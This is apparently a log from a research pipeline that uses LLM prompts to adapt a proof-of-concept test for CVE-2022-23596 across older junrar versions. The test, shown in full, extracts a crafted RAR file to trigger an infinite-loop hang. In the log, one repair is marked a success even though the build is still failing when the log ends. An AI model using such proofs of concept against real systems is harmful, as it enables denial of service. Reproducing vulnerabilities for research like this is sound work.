Running main_process.py for CVE: CVE-2022-23596
Versions: 5.0.0, 1.0.1

[1m[Main] === Starting adaptation process for CVE-2022-23596 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/com_github_junrar_junrar.txt[0m
[96m[Analyzer] com.github.junrar:junrar has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['0.7', '1.0.0', '1.0.1', '2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2022-23596[0m
[92m[Main] Total affected versions: 15[0m
[92m[Main] Already reproduced versions: 7[0m
[93m[Main] Versions pending adaptation: 8[0m
[96m[Main]     -> ['0.7', '1.0.0', '1.0.1', '2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0'][0m
[96m[Main]     -> ['6.0.0', '6.0.1', '7.0.0', '7.1.0', '7.2.0', '7.3.0', '7.4.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 5.0.0[0m
[96m[Selector] Closest reproduced version: 6.0.0 at index 8[0m
[96m[Adapter] Trying next closest version: 5.0.0[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit[0m
[96m[Preparer] Updating dependency version to 5.0.0 in /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 5.0.0 in /PoCAdaptation/exploit/pending/CVE-2022-23596/5.0.0/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 5.0.0...[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 6.0.0 to 5.0.0...[0m
[96m[Adapter] Start adapting exploit from 6.0.0 to 5.0.0"[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class CorruptHeaderException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package com.github.junrar.exception[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class CorruptHeaderException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1517 (prompt), 1 (completion), 1518 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 5.0.0:com.github.junrar:junrar.
This test file compiles and runs successfully with version 6.0.0.

Your task is to:
1. Analyze why this issue occurs with the *6.0.0* but not with the *5.0.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
  symbol:   class CorruptHeaderException
  location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
  symbol:   class CorruptHeaderException
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.983 s
[INFO] Finished at: 2025-07-13T14:15:51Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[6,35] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: package com.github.junrar.exception
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[27,33] cannot find symbol
[ERROR]   symbol:   class CorruptHeaderException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>edu.vision.se</groupId><version>1.0-SNAPSHOT</version><modelVersion>4.0.0</modelVersion>
  <artifactId>CVE-2022-23596</artifactId>
  <name>junrar CVE-2022-23596</name>

  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>

  <dependencies>
    <dependency>
      <groupId>com.github.junrar</groupId>
      <artifactId>junrar</artifactId>
      <version>5.0.0</version>
    </dependency>
    <dependency>
        <groupId>cn.hutool</groupId>
        <artifactId>hutool-all</artifactId>
        <version>5.7.10</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 141 (prompt), 16 (completion), 157 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 5.0.0: 

Error: cannot find symbol, class CorruptHeaderException, package com.github.junrar.exception 

The test executes as expected in 6.0.0 

Error code: import com.github.junrar.exception.CorruptHeaderException; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
com.github.junrar.exception.CorruptHeaderException;CorruptHeaderException
[96m[ErrorManager] Extracted key entities: ['com.github.junrar.exception.CorruptHeaderException', 'CorruptHeaderException'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 6, 'column': 35, 'message': 'cannot find symbol', 'symbol': 'class CorruptHeaderException', 'location': 'package com.github.junrar.exception', 'code_line': 'import com.github.junrar.exception.CorruptHeaderException;'} with cause: ['com.github.junrar.exception.CorruptHeaderException', 'CorruptHeaderException'][0m
[96m[Adapter] Related diffs for error: [(18, 2.0), (0, 0.0), (1, 0.0), (2, 0.0), (3, 0.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class CorruptHeaderException cause: ['com.github.junrar.exception.CorruptHeaderException', 'CorruptHeaderException'][0m
[96m[RepairModule] Trying best diff #18 with score 2.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #18 with score 2.00[0m
[LLMClient] Tokens used: 526 (prompt), 190 (completion), 716 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 5.0.0:com.github.junrar:junrar.
This test file compiles and runs successfully in 6.0.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 6.0.0 to 5.0.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class CorruptHeaderException, location: package com.github.junrar.exception

### Error Position:
import com.github.junrar.exception.CorruptHeaderException;

### Related Diff:
Operation: MODIFIED, File: src/main/java/com/github/junrar/Archive.java, Hunk: @@ -292,7 +289,7 @@ private void readHeaders(final long fileLength) throws IOException, RarException
             UnrarHeadertype headerType = block.getHeaderType();
             if (headerType == null) {
                 logger.warn("unkonwn block header!");
+                throw new RarException(RarExceptionType.corruptHeader);
-                throw new CorruptHeaderException();
             }
             switch (headerType) {

### Test File Content:
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Junrar;
import org.junit.Test;
import com.github.junrar.exception.CorruptHeaderException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof CorruptHeaderException);
    }
}



[LLMClient] Response: 
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Junrar;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success![0m
[92m[RepairModule] Repair success with diff #18 at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 6.0.0 to 5.0.0 successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 5.0.0...[0m
[92m[Executor] Adaptation + reproduction successful on 5.0.0[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-23596/5.0.0[0m
[1m[Main] === Starting adaptation process for CVE-2022-23596 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/com_github_junrar_junrar.txt[0m
[96m[Analyzer] com.github.junrar:junrar has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['0.7', '1.0.0', '1.0.1', '2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2022-23596[0m
[92m[Main] Total affected versions: 15[0m
[92m[Main] Already reproduced versions: 12[0m
[93m[Main] Versions pending adaptation: 3[0m
[96m[Main]     -> ['0.7', '1.0.0', '1.0.1'][0m
[96m[Main]     -> ['2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0', '6.0.0', '6.0.1', '7.0.0', '7.1.0', '7.2.0', '7.3.0', '7.4.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 1.0.1[0m
[96m[Selector] Closest reproduced version: 2.0.0 at index 3[0m
[96m[Adapter] Trying next closest version: 1.0.1[0m
[96m[Preparer] Using closest existing exploit version: /PoCAdaptation/exploit/valid/CVE-2022-23596/5.0.0/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit[0m
[96m[Preparer] Updating dependency version to 1.0.1 in /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 1.0.1 in /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 1.0.1...[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 2.0.0 to 1.0.1...[0m
[96m[Adapter] Start adapting exploit from 2.0.0 to 1.0.1"[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package com.github.junrar[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1507 (prompt), 1 (completion), 1508 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully with version 2.0.0.

Your task is to:
1. Analyze why this issue occurs with the *2.0.0* but not with the *1.0.1 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
  symbol:   class Junrar
  location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
  symbol:   variable Junrar
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.035 s
[INFO] Finished at: 2025-07-13T14:16:28Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
[ERROR]   symbol:   class Junrar
[ERROR]   location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
[ERROR]   symbol:   variable Junrar
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>edu.vision.se</groupId><version>1.0-SNAPSHOT</version><modelVersion>4.0.0</modelVersion>
  <artifactId>CVE-2022-23596</artifactId>
  <name>junrar CVE-2022-23596</name>

  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>

  <dependencies>
    <dependency>
      <groupId>com.github.junrar</groupId>
      <artifactId>junrar</artifactId>
      <version>1.0.1</version>
    </dependency>
    <dependency>
        <groupId>cn.hutool</groupId>
        <artifactId>hutool-all</artifactId>
        <version>5.7.10</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 135 (prompt), 11 (completion), 146 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 1.0.1: 

Error: cannot find symbol, class Junrar, package com.github.junrar 

The test executes as expected in 2.0.0 

Error code: import com.github.junrar.Junrar; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
com.github.junrar.Junrar;Junrar
[96m[ErrorManager] Extracted key entities: ['com.github.junrar.Junrar', 'Junrar'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 4, 'column': 25, 'message': 'cannot find symbol', 'symbol': 'class Junrar', 'location': 'package com.github.junrar', 'code_line': 'import com.github.junrar.Junrar;'} with cause: ['com.github.junrar.Junrar', 'Junrar'][0m
[96m[Adapter] Related diffs for error: [(37, 8.0), (0, 0.0), (1, 0.0), (2, 0.0), (3, 0.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class Junrar cause: ['com.github.junrar.Junrar', 'Junrar'][0m
[96m[RepairModule] Trying best diff #37 with score 8.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #37 with score 8.00[0m
[LLMClient] Tokens used: 538 (prompt), 189 (completion), 727 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully in 2.0.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 2.0.0 to 1.0.1.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class Junrar, location: package com.github.junrar

### Error Position:
import com.github.junrar.Junrar;

### Related Diff:
Operation: MODIFIED, File: src/main/java/com/github/junrar/extract/ExtractArchive.java, Hunk: @@ -1,15 +1,10 @@
 package com.github.junrar.extract;

 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.OutputStream;

+import org.apache.commons.logging.Log;
+
+import com.github.junrar.Archive;
-import com.github.junrar.Junrar;
 import com.github.junrar.exception.RarException;
+import com.github.junrar.rarfile.FileHeader;

 /**
  * extract an archive to the given location

### Test File Content:
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Junrar;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}


[LLMClient] Response: 
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | class Junrar', 'cannot find symbol | variable Junrar'}
[RepairModule] New grouped keys: {'cannot find symbol | variable Junrar'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #37 at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
